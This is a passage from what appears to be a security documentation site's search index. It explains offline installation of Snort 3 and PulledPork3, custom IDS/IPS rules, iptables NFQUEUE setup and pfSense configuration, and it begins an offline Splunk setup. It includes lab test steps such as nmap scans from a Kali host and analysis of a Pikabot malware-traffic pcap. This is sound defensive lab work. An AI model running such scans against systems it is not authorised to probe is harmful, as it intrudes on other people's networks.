https://github.com/google/flatbuffers/archive/refs/tags/v2.0.0.tar.gz -O flatbuffers-v2.0.0.tar.gz\nwget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.16.tar.gz -O libdaq-v3.0.16.tar.gz\nwget [https://github.com/snort3/snort3/archive/refs/tags/3.3.5.0.tar.gz](https://github.com/snort3/snort3/archive/refs/tags/3.3.5.0.tar.gz) -O snort3-3.3.5.0.tar.gz\ngit clone https://github.com/shirkdog/pulledpork3.git\n</code></pre>"},{"location":"snort/snort.html#install-pre-requisites","title":"Install Pre-requisites","text":"<p>Transfer the snort folder to your air-gapped host. </p> <p>Change directory into pre-reqs and install the downloaded <code>.deb</code> files using <code>dpkg</code>:</p> <pre><code>sudo dpkg -i *.deb\n</code></pre>"},{"location":"snort/snort.html#install-dependencies","title":"Install Dependencies","text":"<p>Change directory into snort folder and untar pcre2-10.44.tar.gz</p> <p>Change directory into pcre2-10.44 and run configure.</p> <p>Run make and then sudo make install.</p> <pre><code>tar -xzvf pcre2-10.44.tar.gz\ncd pcre2-10.44/\n./configure\nmake\nsudo make install\n</code></pre> <p>Repeat the same process for gperftools-2.15.tar.gz</p> <pre><code>tar -xzvf gperftools-2.15.tar.gz\ncd gperftools-2.15/\n./configure\nmake\nsudo make install\n</code></pre> <p>Repeat the same process for ragel</p> <pre><code>tar -xzvf ragel-6.10.tar.gz\ncd ragel-6.10\n./configure\nmake\nsudo make install\n</code></pre> <p>Untar Boost C++ Libraries:</p> <pre><code>tar -xvzf boost_1_86_0.tar.gz\n</code></pre> <p>For installing hyerperscan, run:</p> <pre><code>tar -xvzf hyperscan-v5.4.2.tar.gz\nmkdir ~/snort/hyperscan-5.4.2-build\ncd hyperscan-5.4.2-build/\ncmake -DCMAKE_INSTALL_PREFIX=/usr/local -DBOOST_ROOT=~/snort/boost_1_86_0/ ../hyperscan-5.4.2\nmake\nsudo make install\n</code></pre> <p>Install flatbuffers:</p> <pre><code>tar -xzvf flatbuffers-v2.0.0.tar.gz\nmkdir flatbuffers-build\ncd flatbuffers-build\ncmake ../flatbuffers-2.0.0\nmake\nsudo make install\n</code></pre> <p>Install Data Acquistion (DAQ) from Snort</p> <pre><code>tar -xzvf libdaq-v3.0.16.tar.gz\ncd libdaq-3.0.16\n./bootstrap\n./configure\nmake\nsudo make install\n</code></pre> <p>Update the system's dynamic linker run-time bindings (shared libraries)</p> <pre><code>sudo ldconfig\n</code></pre> <p>Install the latest version of Snort 3</p> <pre><code>tar -xzvf snort3-3.3.5.0.tar.gz\ncd snort3-3.3.5.0/\n./configure_cmake.sh --prefix=/usr/local --enable-jemalloc\ncd build\nmake\nsudo make install\n</code></pre> <p>Verify Snort3 is installed by running:</p> <pre><code>/usr/local/bin/snort -V\n\n   ,,_     -*&gt; Snort++ &lt;*-\n  o\"  )~   Version 3.3.5.0\n   ''''    By Martin Roesch &amp; The Snort Team\n           http://snort.org/contact#team\n           Copyright (C) 2014-2024 Cisco and/or its affiliates. All rights reserved.\n           Copyright (C) 1998-2013 Sourcefire, Inc., et al.\n           Using DAQ version 3.0.16\n           Using Hyperscan version 5.4.2 2024-09-10\n           Using Jemalloc version 5.2.1-0-gea6b3e973b477b8061e0076bb257dbd7f3faa756\n           Using libpcap version 1.10.1 (with TPACKET_V3)\n           Using LuaJIT version 2.1.0-beta3\n           Using LZMA version 5.2.5\n           Using OpenSSL 3.0.2 15 Mar 2022\n           Using PCRE version 8.39 2016-06-14\n           Using ZLIB version 1.2.11\n</code></pre> <p>Test snort by using its default config file:</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Find your network interface by running <code>ip a</code></p> <pre><code>ip a\n...\n2: ens32: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000\n    link/ether 00:0c:29:86:08:64 brd ff:ff:ff:ff:ff:ff\n    altname enp2s0\n    inet 10.0.0.22/24 brd 10.0.0.255 scope global dynamic noprefixroute ens32\n</code></pre> <p>Run following:</p> <pre><code>sudo ethtool -k ens32 | grep receive-offload\n...\ngeneric-receive-offload: on\nlarge-receive-offload: off [fixed]\n</code></pre> <p>Create a service to disable Large Receive Offload (LRO)</p> <pre><code>sudo nano /lib/systemd/system/ethtool.service\n</code></pre> <p>Copy and paste following:</p> <p>Put your network interface </p> <pre><code>[Unit]\nDescription=Ethtool Configration for Network Interface\n\n[Service]\nRequires=network.target\nType=oneshot\nExecStart=/sbin/ethtool -K ens32 gro off\nExecStart=/sbin/ethtool -K ens32 lro off\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Enable and start the service</p> <pre><code>sudo systemctl enable ethtool\nsudo service ethtool start\n</code></pre> <p>Verify that LRO is disabled by running</p> <pre><code>sudo ethtool -k ens32 | grep receive-offload\n...\ngeneric-receive-offload: off\nlarge-receive-offload: off [fixed]\n</code></pre>"},{"location":"snort/snort.html#test-ids-with-local-rules","title":"Test IDS with local rules","text":"<p>Create a folder called rules in the following directory</p> <pre><code>sudo mkdir /usr/local/etc/rules\n</code></pre> <p>Create a file called local.rules</p> <pre><code>sudo nano /usr/local/etc/rules/local.rules\n</code></pre> <p>Copy and paste following</p> <p>First alert detects any ICMP Ping traffic and second alert detects any SSH Authentication Attempt to our internal network </p> <pre><code>alert icmp any any -&gt; $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001; rev:1;)\nalert tcp any any -&gt; $HOME_NET 22 (msg:\"SSH Authentication Attempt\"; sid:1000002; rev:1;)\n</code></pre> <p>Run snort with configuration file to test the rule</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Run snort to generate alert in a single line</p> <p>Snort will be listening on ens32 for any icmp traffic</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules -i ens32 -A alert_fast\n</code></pre> <p>From another Linux host, execute ping and attempt ssh to 10.0.0.22. This will generate alerts on terminal verifying that the rule works:</p> <pre><code>09/11-22:01:05.659667 [**] [1:1000002:1] \"SSH Authentication Attempt\" [**] [Priority: 0] {TCP} 10.0.0.21:36708 -&gt; 10.0.0.22:22\n09/11-22:01:19.086427 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.21 -&gt; 10.0.0.22\n</code></pre> <p>Edit Snort\u2019s configuration </p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>For HOME_NET, setup the network addresses you are protecting.</p> <p>For EXTERNAL_NET, leave as any.</p> <p>In the ips section, uncomment enable_builtin_rules = true and add include = \u201c/usr/local/etc/rules/local.rules\u201d, (include comma)</p> <p>In the configure ourputs section uncomment alert_fast = {file=true} to enable logging for the alerts</p> <pre><code>-- HOME_NET and EXTERNAL_NET must be set now\n-- setup the network addresses you are protecting\nHOME_NET = '10.0.0.0/24'\n\n-- set up the external network addresses.\n-- (leave as \"any\" in most situations)\nEXTERNAL_NET = 'any'\n...\nips =\n{\n    -- use this to enable decoder and inspector alerts\n    enable_builtin_rules = true,\n\n    -- use include for rules files; be sure to set your path\n    -- note that rules files can include other rules files\n    -- (see also related path vars at the top of snort_defaults.lua)\n    include = \"/usr/local/etc/rules/local.rules\",\n    variables = default_variables\n}\n...\n---------------------------------------------------------------------------\n-- 7. configure outputs\n---------------------------------------------------------------------------\n-- event logging\n-- you can enable with defaults from the command line with -A &lt;alert_type&gt;\n-- uncomment below to set non-default configs\n--alert_csv = { }\nalert_fast = {file=true}\n</code></pre> <p>Run snort to generate alert in a single line but exclude entry for local rules.</p> <p>Snort will be listening on ens32 for any icmp traffic</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_fast\n</code></pre> <p>Verify that alerts are generated from ping</p> <pre><code>09/11-21:41:15.522160 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.24 -&gt; 10.0.0.22\n09/11-21:41:15.522206 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.22 -&gt; 10.0.0.24\n</code></pre> <p>To output alert_fast as a text log file, run</p> <pre><code>mkdir /var/log/snort\nsudo chown -R 1000:1000 /var/log/snort\n...\nsudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_fast -l /var/log/snort\n</code></pre> <p>Verify that alert_fast.txt file is generated</p> <pre><code>ls /var/log/snort\n...\ncat /var/log/snort/alert_fast.txt\n...\n09/11-23:16:18.831740 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.21 -&gt; 10.0.0.22\n09/11-23:16:37.707792 [**] [1:1000002:1] \"SSH Authentication Attempt\" [**] [Priority: 0] {TCP} 10.0.0.21:60514 -&gt; 10.0.0.22:22\n</code></pre>"},{"location":"snort/snort.html#install-pulledpork3","title":"Install Pulledpork3","text":"<p>Note <code>git clone https://github.com/shirkdog/pulledpork3.git</code> command was run when downloading dependencies.</p> <pre><code>cd ~/snort/pulledpork3\nsudo mkdir /usr/local/bin/pulledpork3\nsudo cp pulledpork.py /usr/local/bin/pulledpork3\nsudo cp -r lib/ /usr/local/bin/pulledpork3\nsudo chmod +x /usr/local/bin/pulledpork3/pulledpork.py\nsudo mkdir /usr/local/etc/pulledpork3\nsudo cp etc/pulledpork.conf /usr/local/etc/pulledpork3/\n</code></pre> <p>Verify that pulled pork is running</p> <pre><code>/usr/local/bin/pulledpork3/pulledpork.py -V\n\nPulledPork v3.0.0.5\n\n    https://github.com/shirkdog/pulledpork3\n      _____ ____\n     `----,\\    )   PulledPork v3.0.0.5\n      `--==\\\\  /    Lowcountry yellow mustard bbq sauce is the best bbq sauce. Fight me.\n       `--==\\\\/\n     .-~~~~-.Y|\\\\_  Copyright (C) 2021 Noah Dietrich, Colin Grady, Michael Shirk\n  @_/        /  66\\_  and the PulledPork Team!\n    |    \\   \\   _(\")\n     \\   /-| ||'--'   Rules give me wings!\n      \\_\\  \\_\\\\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n</code></pre> <p>Edit pulledpork.conf </p> <pre><code>sudo nano /usr/local/etc/pulledpork3/pulledpork.conf\n</code></pre> <p>Change the community ruleset value to true.</p> <p>Yon can select registered ruleset but due to incompatibility between registered ruleset version (3.1.7.0) and the snort version (3.3.5.0), selecting registered ruleset will give you an error. Either install Snort v 3.1.X.X or wait for registered ruleset version (3.3.X.X) to get released or use the community ruleset in the meantime. </p> <p>Copy and paste your Oinkcode (API Key). This step is optional.</p> <p>Comment out blocklist_path</p> <p>Uncomment snort_path and make sure it is set to the right path</p> <p>Uncomment local_rules and make sure it is set to the right path</p> <p>Comment sorule_path (optional but if uncommented, make a directory /usr/local/etc/so_rules/)</p> <pre><code># Which Snort/Talos rulesets do you want to download (recomended: choose only one)\ncommunity_ruleset = true\nregistered_ruleset = false\nLightSPD_ruleset = false\n\n# Your Snort oinkcode is required for snort/talos Subscription, Light_SPD, and Registered rules&gt;\noinkcode = \n\n# Where to write the blocklist file (single file containing all blocklists downloaded)\n#blocklist_path = /usr/local/etc/lists/default.blocklist\n\n# Where is the Snort Executable located (if not on the system path)\nsnort_path = /usr/local/bin/snort\n\n# Local Rules files\n# Specify local rules files, comma-separated\nlocal_rules = /usr/local/etc/rules/local.rules  \n\n# where should so rules be saved\n# so rules will only be processed if this is uncommented\nsorule_path = /usr/local/etc/so_rules/\n</code></pre> <p>To obtain the Oinkcode, create an account in Snort3.</p> <p></p> <p>Run Pulledpork3 </p> <pre><code>sudo /usr/local/bin/pulledpork3/pulledpork.py -c /usr/local/etc/pulledpork3/pulledpork.conf\n</code></pre> <p>If you receive error below, make a directory called so_rules</p> <pre><code>ERROR: `sorule_path` is configured but is not a directory:  /usr/local/etc/so_rules/\n...\nsudo mkdir /usr/local/etc/so_rules/\n</code></pre>"},{"location":"snort/snort.html#troubleshooting-for-registered-ruleset","title":"Troubleshooting for Registered Ruleset","text":"<p>If you have selected registered ruleset and receive the error below, edit snort rules version number in pulledpork.py</p> <pre><code>WARNING: Unable to load rules archive:  422 Client Error: Unprocessable Content for url: https://snort.org/rules/snortrules-snapshot-3350.tar.gz?oinkcode=&lt;hidden&gt;\n</code></pre> <p>Make a backup copy of pulledpork.py and edit pulledpork.py</p> <pre><code>sudo cp /usr/local/bin/pulledpork3/pulledpork.py /usr/local/bin/pulledpork3/oldpulledpork.py\nsudo nano /usr/local/bin/pulledpork3/pulledpork.py\n</code></pre> <p>Edit RULESET_URL_SNORT_REGISTERED</p> <p>The snortrules-snapshot version number can be found on https://www.snort.org/downloads</p> <p>The numbers indicate version number so 31730 (v3.1.7.0) is the latest registered Snort rulest. </p> <p>Community rules are free and maintained by the Snort community. Registered rules are available for free but require you to create an account on the Snort website and obtain an Oinkcode. Subscriber rules required a paid subscription and provides immediate access to the most up-to-date rules. </p> <pre><code>RULESET_URL_SNORT_REGISTERED = 'https://snort.org/rules/snortrules-snapshot-31470.tar.gz'\n</code></pre>"},{"location":"snort/snort.html#test-ids-with-community-ruleset","title":"Test IDS with Community Ruleset","text":"<p>Rerun Pulledpork:</p> <pre><code>sudo /usr/local/bin/pulledpork3/pulledpork.py -c /usr/local/etc/pulledpork3/pulledpork.conf\n...\nWriting rules to:  /usr/local/etc/rules/pulledpork.rules\nProgram execution complete.\n</code></pre> <p>Edit snort\u2019s config to point to Pulledpork\u2019s rules</p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>Change the include path to point to pulledpork.rules</p> <pre><code>ips =\n{\n    -- use this to enable decoder and inspector alerts\n    enable_builtin_rules = true,\n\n    -- use include for rules files; be sure to set your path\n    -- note that rules files can include other rules files\n    -- (see also related path vars at the top of snort_defaults.lua)\n    include = \"/usr/local/etc/rules/pulledpork.rules\",\n    variables = default_variables\n}\n</code></pre> <p>You can see what the rules look like</p> <pre><code>cat /usr/local/etc/rules/pulledpork.rules | less\n</code></pre> <p>Test Snort</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua --plugin-path /usr/local/etc/so_rules/\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Trigger alert by running:</p> <pre><code>curl http://testmyids.com\n</code></pre> <p>Verify that alerts are generated by the community rules</p> <pre><code>tail alert_fast.txt \n</code></pre> <pre><code>09/16-23:11:10.392572 [**] [1:498:11] \"INDICATOR-COMPROMISE id check returned root\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 217.160.0.187:80 -&gt; 10.0.0.22:36062\n09/16-23:11:12.926837 [**] [1:498:11] \"INDICATOR-COMPROMISE id check returned root\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 217.160.0.187:80 -&gt; 10.0.0.22:36076\n</code></pre>"},{"location":"snort/snort.html#test-ips","title":"Test IPS","text":"<p>Start Snort in IPS mode using DAQ AFPacket by running:</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua --daq afpacket -A alert_fast -l /var/log/snort -i ens32\n</code></pre> <p>Note to run Snort in IPS mode using DAQ NFQueue, run: </p> <pre><code>sudo snort -Q --daq nfq --daq-var device=ens32 --daq-var queue=1 -c /usr/local/etc/snort/snort.lua -A alert_fast -l /var/log/snort\n</code></pre> <p>Create the queue. To send traffic for the interface <code>ens32</code> to NFQ, for incoming and outgoing traffic on the <code>ens32</code> interface:</p> <pre><code>sudo iptables -I INPUT -i ens32 -j NFQUEUE --queue-num 1\nsudo iptables -I OUTPUT -o ens32 -j NFQUEUE --queue-num 1\n</code></pre> <p>For forwarded traffic (if Snort is installed at the gateway):</p> <pre><code>sudo iptables -I FORWARD -i ens32 -j NFQUEUE --queue-num 1\n</code></pre> <p>Verify iptables configuration by running:</p> <pre><code>sudo iptables -L -v -n\n</code></pre> <p>To determine the line numbers for your <code>NFQUEUE</code> rules, run:</p> <pre><code>sudo iptables -L --line-numbers\n</code></pre> <p>This will output a list of all the rules in your iptables with their corresponding line numbers. You should look for the rules in the <code>INPUT</code> and <code>OUTPUT</code> chains that mention <code>NFQUEUE</code>, and note their line numbers. Once you have the line numbers, you can delete the rules using:</p> <pre><code>sudo iptables -D INPUT &lt;line_number&gt;\nsudo iptables -D OUTPUT &lt;line_number&gt;\n</code></pre> <p>Change verb in the local.rules from <code>alert</code> to <code>drop</code> </p> <pre><code>nano /usr/local/etc/rules/local.rules\n</code></pre> <pre><code>drop icmp any any -&gt; $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001; rev:1;)\ndrop tcp any any -&gt; $HOME_NET 22 (msg:\"SSH Authentication Attempt\"; sid:1000002; rev:1;)\n</code></pre> <p>From another internal host, run ping to Snort virtual machine. Ping should not go through.</p> <pre><code>ping 10.0.0.22\n</code></pre> <p>Verify that alerts have been generated in alert_fast.txt</p> <pre><code>tail /var/log/snort/alert_fast.txt\n</code></pre> <p>Note: running Snort in IPS mode using DAQ NFQueue is ideal in this scenario but this does not generate logs in alert_fast.txt. For demonstration purposes, Snort was run in IPS mode using DAQ AFPacket.</p>"},{"location":"snort/snort.html#install-snort-ruleset-offline","title":"Install Snort Ruleset Offline","text":"<p>On a machine with internet connection, download snort3-community-rules.tar.gz from https://www.snort.org/downloads</p> <p>Transfer the tarball to the air-gapped environment. </p> <p>Make a folder called snort-rules</p> <p>Untar the tarball to snort-rules folder</p> <pre><code>mkdir ~/snort/snort-rules\ntar -xvzf snort3-community-rules.tar.gz -C /home/cyber/snort/snort-rules/\n</code></pre> <p>Merge all <code>.rules</code> into single rule file:</p> <pre><code>cat *.rules &gt; merged.rules\n</code></pre> <p>Move the Merged File to the pulledpork.rules in the Snort Rules Directory:</p> <pre><code>sudo mv merged.rules /etc/snort/rules/pulledpork.rules\n</code></pre>"},{"location":"snort/snort.html#malware-traffic-analysis-reading-pcap-with-snort","title":"Malware traffic analysis - reading pcap with Snort","text":"<p>Make a directory called test and cd into it.</p> <p>Download a sample pcap from https://www.malware-traffic-analysis.net</p> <pre><code>mkdir ~/test\ncd ~/test\nwget https://www.malware-traffic-analysis.net/2024/02/08/2024-02-08-TA577-Pikabot-infection-traffic.pcap.zip\nunzip 2024-02-08-TA577-Pikabot-infection-traffic.pcap.zip \n</code></pre> <p>Read the pcap with Snort and focus on signatures generated</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua --plugin-path /usr/local/etc/so_rules/ -r 2024-02-08-TA577-Pikabot-infection-traffic.pcap -A alert_fast -q &gt; pcap-signatures_pikabot.txt\n</code></pre> <p>Cat out or grep out pcap-signatures_pikabot.txt</p> <pre><code>cyber@Snort:~/test$ cat pcap-signatures_pikabot.txt | cut -d \"]\" -f 3 | cut -d \"[\" -f 1 |  cut -d '\"' -f 2 | sort | uniq -c | sort -nr\n    110 (arp_spoof) unicast ARP request\n      4 PROTOCOL-DNS SPOOF query response with TTL of 1 min. and no authority\n      4 INDICATOR-SCAN UPnP service discover attempt\n      1 (http_inspect) URI path contains consecutive slash characters\n      1 (http_inspect) Content-Transfer-Encoding used as HTTP header\n</code></pre> <pre><code>grep -i spoof pcap-signatures_pikabot.txt \n02/09-05:25:59.548577 [**] [1:254:17] \"PROTOCOL-DNS SPOOF query response with TTL of 1 min. and no authority\" [**] [Classification: Potentially Bad Traffic] [Priority: 2] {UDP} 10.2.8.1:53 -&gt; 10.2.8.101:64560\n02/09-05:29:14.405544 [**] [112:1:1] \"(arp_spoof) unicast ARP request\" [**] [Priority: 3] {ARP}  -&gt; \n</code></pre>"},{"location":"snort/snort.html#install-snort-on-gateway","title":"Install Snort on Gateway","text":"<p>While Suricata can be installed on a host, it can also be installed on a gateway such as pfSense. The pfSense\u00a0is a free and open source firewall and router. For installing and configuring pfSense, refer to pfSense documentation and instruction video. pfSense can be downloaded from here.</p> <p>Full demonstration video on configuring Suricata on pfSense can be found here. </p> <p>After competing basic configuration on pfSense, navigate to System &gt; Package Manager &gt; Available Packages on pfSense web UI.</p> <p>Search for <code>snort</code> and click install (confirm when prompted). Internet connection is required.</p> <p></p> <p>Navigate to Services &gt; Snort &gt; Global Settings tab. </p>"},{"location":"snort/snort.html#test-ids-and-ips-with-open-source-rules","title":"Test IDS and IPS with open source rules","text":"<p>In this demonstration, we are running Snort on the WAN interface. Full demonstration video can be found here. </p> <p>Select Enable Snort VRT. Copy and paste your Snort Oinkmaster Code (you will need to create an account in https://www.snort.org/).</p> <p>Enable Snort GPLv2, and ET Open.</p> <p></p> <p>Enable OpenAppID, AppID Open Text Rules, and FEODO Tracker Botnet C2 IP Rules.</p> <p>Set Rule Update Interval to 1 Day and select Hide Deprecated Rules Categories.</p> <p></p> <p>Select Remove Blocked Hosts interval to your preferred time. Click save.</p> <p></p> <p>Navigate to the Updates tab and click Update Rules.</p> <p></p> <p>Once the update is complete, you will see timestamps of when the update is completed.</p> <p></p> <p>Navigate to Interfaces tab and add a WAN interface. Enable Interface and name it WAN.</p> <p></p> <p>Select Block Offenders. Set IPS Mode to Legacy Mode and select SRC IP to Block. Click Save.</p> <p></p> <p>Navigate to WAN Categories. Select Use IPS Policy and set IPS Policy to Security. Click Save.</p> <p></p> <p>Navigate to WAN Rules. Select IPS Policy-Security and click Apply.</p> <p></p> <p>Navigate to WAN IP Rep and select Enable IP Reputation. Click Save.</p> <p></p> <p>Make sure the WAN interface is up and running. If not, click the play button.</p> <p></p> <p>Navigate to Firewall &gt; NAT and add 1:1 NAT for Windows host. </p> <p></p> <p>Navigate to Firewall &gt; Virtual IPs and add Public IP for Windows host.</p> <p></p> <p>From Kali machine, run <code>nmap (public IP)</code> </p> <p>Navigate to Alerts and verify that alerts have been generated.</p> <p></p> <p>Navigate to Blocked and verify that the Kali machine is being blocked</p> <p></p>"},{"location":"snort/snort.html#test-ids-and-ips-with-custom-rules","title":"Test IDS and IPS with custom rules","text":"<p>In this demonstration, we are running Snort on the LAN interface. </p> <p>Navigate to Snort Interfaces &gt; WAN Settings. In this demonstration, we have changed the WAN to LAN. Enable interface and name it as the LAN interface. </p> <p></p> <p>Save and Edit the LAN interface. Note instead of WAN Settings it now displays LAN Settings.</p> <p>Navigate to LAN Rules and select custom.rules. Copy and paste the following rule to detect ping from internal to external network.</p> <pre><code>alert icmp $HOME_NET any -&gt; [8.8.8.8] any (msg:\"ICMP Ping Detected to EXTERNAL IP\"; sid:1000001; rev:1;)\n</code></pre> <p></p> <p>Turn on the LAN interface by clicking the play button.</p> <p></p> <p>From the Windows host that is connect to an internal network, run ping to 8.8.8.8</p> <pre><code>ping 8.8.8.8\n</code></pre> <p>Navigate to Alerts and verify that Alerts have been generated.</p> <p></p> <p>Navigate to Snort Interfaces &gt; LAN Settings. </p> <p>Select Block Offenders. Set IPS Mode to Inline Mode and click Save.</p> <p></p> <p>Navigate to LAN Rules. Select custom.rules. Change the rule verb from <code>alert</code> to <code>drop</code> </p> <pre><code>drop icmp $HOME_NET any -&gt; [8.8.8.8] any (msg:\"ICMP Ping Detected to EXTERNAL IP\"; sid:1000001; rev:1;)\n</code></pre> <p></p> <p>From the Windows host that is connect to an internal network, run ping to 8.8.8.8</p> <pre><code>ping 8.8.8.8\n</code></pre> <p>Verify that pings were dropped.</p> <p></p>"},{"location":"snort/snort.html#references","title":"References","text":"<ul> <li>https://docs.snort.org/start/</li> <li>https://github.com/snort3/snort3</li> <li>https://youtu.be/j7Wapw3Gxvg?si=cVRojAePvL7z5rMx</li> <li>https://youtu.be/TvQfD5oUN5o?si=-Wx0jDCGnpeXz-8M</li> <li>https://youtu.be/SapAcfHbQSE?si=LPiMoqLVnZ5D2Lqx</li> </ul>"},{"location":"splunk/splunk.html","title":"Splunk","text":"<p>Splunk Enterprise is a Security Information and Event Management (SIEM) tool usually installed on the server. It is designed for searching, analysing, and visualising data. It allows users to collect and ingest data, and search across various data types. Splunk Universal Forwarders are usually installed on clients to provide reliable, secure data collection and forward that data into Splunk Enterprise for indexing. This part of documentation focuses on installing and configuring Splunk. For Splunk, the main focus will be installing Splunk Enterprise and Universal Forwarder. </p>"},{"location":"splunk/splunk.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Splunk Enterprise was installed on an Ubuntu VM (Virtual Machine), and the Splunk Universal Forwarder was installed on both Ubuntu and Windows VMs. An attack emulation was conducted on the FortiGate VM in a safe and controlled environment.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> <p>For Documentation:</p> Hostname OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Splunk Ubuntu 24.04 Splunk Enterprise (server), SC4S 10.0.0.100 Ubuntu Ubuntu 24.04 Splunk Universal Forwarder (Linux client) 10.0.0.200 WS2019 Windows Server 2019 Splunk Universal Forwarder (Windows client) 10.0.0.50 Kali Kali Linux 2025.1 Attacker machine 10.0.0.22 <p></p>"},{"location":"splunk/splunk.html#installing-splunk-enterprise-offline","title":"Installing Splunk Enterprise Offline","text":"<p>This documentation explains how to install Splunk Enterprise offline on Ubuntu or CentOS virtual machines (VMs).</p> <p></p>"},{"location":"splunk/splunk.html#on-an-internet-connected-machine-ubuntu","title":"On an Internet-Connected Machine (Ubuntu)","text":"<p>On an internet-connected Ubuntu VM, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/splunk-offline/{vmtools,nettools,docker,sc4s,apps}\n</code></pre> <p>Download and install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). After installing VM tools, reboot the VM. </p> <pre><code>cd ~/splunk-offline/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>Register on the Splunk website for a free trial and download Splunk Enterprise for Linux. There are options for <code>.tgz</code>, <code>.deb</code>, and <code>.rpm</code>. Use <code>wget</code> and copy and paste the wget link in the <code>splunk-offline</code> directory. </p> <pre><code>cd ~/splunk-offline\nwget -O splunk-9.4.1-linux-amd64.tgz \"https://download.splunk.com/products/splunk/releases/9.4.1/linux/splunk-9.4.1-&lt;SNIP&gt;-linux-amd64.tgz\"\n</code></pre> <p>Download Docker Engine and its dependencies. If you are using CentOS, skip this step as Podman is already installed.</p> <pre><code>#Ubuntu 22.04\ncd ~/splunk-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.22.04~jammy_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.22.04~jammy_amd64.deb\n</code></pre> <pre><code>#Ubuntu 24.04\ncd ~/splunk-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.24.04~noble_amd64.deb\nwget https://download.docker.com/linux/ubuntu/dists/noble/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.24.04~noble_amd64.deb\n</code></pre> <p>Download net-tools. </p> <pre><code>cd ~/splunk-offline/nettools\napt-get download net-tools\n</code></pre> <p>Download the latest SC4S container image\u00a0<code>oci_container.tgz</code>\u00a0from SC4S GitHub page.</p> <pre><code>cd ~/splunk-offline/sc4s\nwget https://github.com/splunk/splunk-connect-for-syslog/releases/download/v3.34.3/oci_container.tar.gz\n</code></pre> <p>Download the following Splunk Apps (tar archive files). You will need to login using the registered credential.</p> <ul> <li>Splunk Add-on for MS Windows</li> <li>Splunk Add-on for Sysmon</li> <li>Fortinet FortiGate Add-On for Splunk (optional: required if ingesting FortiGate logs through this App)</li> <li>Splunk Add-on for Unix and Linux</li> </ul> <p>Copy the Splunk Apps to <code>~/splunk-offline/apps/</code> directory. Verify that the apps have been copied.</p> <pre><code>cp ~/Downloads/*.tgz ~/splunk-offline/apps/\ncd ~/splunk-offline/apps/\nls\n</code></pre> <p>Compress all dependencies with <code>sudo</code> privileges before transferring them. This process may take some time.</p> <pre><code>cd ~/splunk-offline\nsudo tar -czvf splunk-offline.tar.gz *\n</code></pre> <p>Change the ownership of <code>splunk-offline.tar.gz</code> to your standard user and group, then verify the change.</p> <pre><code>sudo chown $(whoami):$(id -g -n) splunk-offline.tar.gz\nls -la\n</code></pre> <p>Transfer <code>splunk-offline.tar.gz</code> to 